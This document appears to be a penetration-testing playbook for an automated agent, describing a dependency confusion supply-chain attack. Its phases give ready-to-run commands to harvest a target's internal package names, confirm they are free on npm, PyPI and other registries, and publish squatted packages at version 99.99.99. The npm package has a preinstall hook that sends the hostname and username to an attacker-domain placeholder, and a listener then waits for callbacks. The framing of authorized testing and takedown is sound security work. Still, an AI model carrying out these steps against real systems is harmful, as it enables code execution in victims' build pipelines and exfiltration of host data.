---
name: attack-dependency-confusion
description: "Dependency Confusion — supply-chain substitution attack registering public npm/pip/composer/gem/maven packages that shadow a target's internal private package names"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - dependency-confusion
  - supply-chain
  - npm
  - pip
  - composer
  - attack
tech_stack:
  - npm
  - pypi
  - composer
  - maven
  - rubygems
  - docker
cwe_ids:
  - CWE-427
  - CWE-1357
chains_with:
  - wstg-conf-02
prerequisites: []
severity_boost:
  wstg-conf-02: "Exposed build/CI configuration from WSTG-CONF-02 confirms internal package names and registry priority, turning a blind guess into a targeted supply-chain hit"
---

# Dependency Confusion

## Objective

Identify internal/private package names referenced by the target's build manifests, then register a same-named **public** package on the corresponding public registry so that a misconfigured package manager pulls the attacker's malicious package instead of the intended private one — achieving code execution in the target's build/CI/production environment.

## Testing Methodology

### Phase 1: Harvest Internal Package Names

```bash
# Look for manifest files leaked via public repos, JS bundles, error stack traces,
# Docker images, or npm/pip cache artifacts exposed on the target's infrastructure
curl -s "https://TARGET/package.json" | jq '.dependencies, .devDependencies'
curl -s "https://TARGET/composer.json" | jq '.require'
curl -s "https://TARGET/requirements.txt"
curl -s "https://TARGET/pom.xml"

# Search public JS bundles for internal-looking scoped/unscoped package names
curl -s "https://TARGET/static/main.js" | grep -oE '"@?[a-z0-9_-]+/[a-z0-9._-]+"' | sort -u

# GitHub/GitLab dorking for leaked manifests (internal company naming conventions
# often look like: companyname-utils, internal-auth-lib, acme-core, etc.)
```

### Phase 2: Confirm Package Is Missing From the Public Registry

```bash
# npm
for pkg in acme-utils acme-auth-lib internal-logger companyname-core; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
  echo "$pkg -> $code"   # 404 = available to squat
done

# PyPI
curl -s -o /dev/null -w "%{http_code}\n" "https://pypi.org/pypi/PACKAGE_NAME/json"

# Composer / Packagist
curl -s -o /dev/null -w "%{http_code}\n" "https://packagist.org/packages/vendor/PACKAGE_NAME.json"

# RubyGems
curl -s -o /dev/null -w "%{http_code}\n" "https://rubygems.org/api/v1/gems/PACKAGE_NAME.json"

# Maven Central
curl -s "https://search.maven.org/solrsearch/select?q=g:%22GROUP_ID%22+AND+a:%22ARTIFACT_ID%22&wt=json" | jq '.response.numFound'
```

### Phase 3: Automated Multi-Ecosystem Scan

```bash
git clone https://github.com/visma-prodsec/confused.git && cd confused
go build
# Scan a manifest against the relevant registry
./confused -l npm /path/to/package.json
./confused -l pip /path/to/requirements.txt
./confused -l gem /path/to/Gemfile
./confused -l composer /path/to/composer.json
```

### Phase 4: Register the Squatted Package (npm Example)

```bash
mkdir dep-confusion-poc && cd dep-confusion-poc
npm init -y
# Bump version HIGHER than any internal version so semver resolution prefers it
# when the private registry is unreachable or not scoped correctly
python3 -c "import json; d=json.load(open('package.json')); d['name']='INTERNAL_PACKAGE_NAME'; d['version']='99.99.99'; json.dump(d, open('package.json','w'), indent=2)"

# Benign, OOB-only preinstall/postinstall for proof of execution (authorized scope only)
cat > index.js <<'EOF'
const https = require('https');
const os = require('os');
https.get(`https://ATTACKER.DOMAIN.TLD/hit?host=${os.hostname()}&user=${os.userInfo().username}`);
EOF
python3 -c "
import json
d=json.load(open('package.json'))
d['scripts']={'preinstall':'node -e \"require(\\'https\\').get(\\'https://ATTACKER.DOMAIN.TLD/hit?h=\\'+require(\\'os\\').hostname())\"'}
json.dump(d, open('package.json','w'), indent=2)
"

npm login   # attacker-controlled npm account
npm publish --access public
```

### Phase 5: Register the Squatted Package (PyPI Example)

```bash
mkdir pip-confusion-poc && cd pip-confusion-poc
cat > setup.py <<'EOF'
from setuptools import setup
setup(
    name="INTERNAL_PACKAGE_NAME",
    version="99.99.99",
    packages=[],
)
EOF
python3 -m build
python3 -m twine upload --repository pypi dist/*
```

### Phase 6: Monitor for Install Callback

```bash
attack_script generic_listener -p 443 -o dependency_confusion_evidence.json
# Wait for the target's CI/build pipeline to run `npm install` / `pip install`
# and trigger the OOB callback in the published package
```

## What Constitutes a Finding

| Finding | Severity |
|---|---|
| Public package installs and executes in target's CI/CD or production build (confirmed OOB callback) | Critical (P1) |
| Internal package name confirmed missing from public registry, install source not yet verified | High (P2) |
| Build manifest references private package with no registry scoping/pinning (`--registry`, scoped `@org:registry=`) | Medium (P3) |
| Internal naming convention leaked but no exploitable install path found | Low (P4) |

## Evidence Requirements

- Manifest file (package.json/requirements.txt/composer.json/pom.xml) showing the referenced internal package name and version constraint
- Registry lookup proving the name was unclaimed at time of testing (HTTP 404 screenshot/log)
- OOB callback log (`dependency_confusion_evidence.json`) proving the target's infrastructure actually installed and executed the attacker package
- Immediately unpublish/deprecate the squatted package after proof-of-concept and document the takedown timestamp

## Tools

- `confused` (visma-prodsec) — multi-ecosystem dependency confusion scanner
- `DepFuzzer` (synacktiv) — dependency confusion / owner-email-takeover finder
- `npm publish` / `twine upload` / `composer` / `gem push` — registry publishing
- `attack_script generic_listener` — OOB install-callback listener

## References

- [PayloadsAllTheThings: Dependency Confusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Dependency%20Confusion)
- [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies - Alex Birsan](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [Exploiting Dependency Confusion - Aman Sapra](https://0xsapra.github.io/website/Exploiting-Dependency-Confusion)
- [3 Ways to Mitigate Risk When Using Private Package Feeds - Microsoft](https://azure.microsoft.com/en-gb/resources/3-ways-to-mitigate-risk-using-private-package-feeds/)
